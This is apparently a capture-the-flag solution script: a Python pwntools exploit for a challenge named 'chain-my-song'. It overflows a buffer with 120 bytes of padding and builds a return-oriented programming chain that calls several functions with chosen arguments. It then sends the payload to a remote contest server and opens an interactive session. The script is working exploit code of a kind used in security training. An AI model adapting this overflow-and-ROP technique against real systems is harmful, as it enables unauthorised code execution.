#!/usr/bin/python3

from pwn import *

padlen = 120

sweetdreams = 0x401175
aremadeof = 0x4011bb
whoami = 0x401156

#ROP
popRDI = p64(0x00000000004012b3)
popRSI = p64(0x00000000004012b1)

exp = b"a" * padlen
exp += popRDI + p64(0xb16bad) + p64(sweetdreams)
exp += popRDI + p64(0xbadf00d) + popRSI + p64(0xfee1dead) + p64(0x42424242)  + p64(aremadeof)
exp += p64(whoami)

#prg = process("chain-my-song")
prg = remote("srv4.magpiectf.ca", 1982)
prg.sendline(exp)
prg.interactive()

#sys.stdout.buffer.write(exp + b'\n')
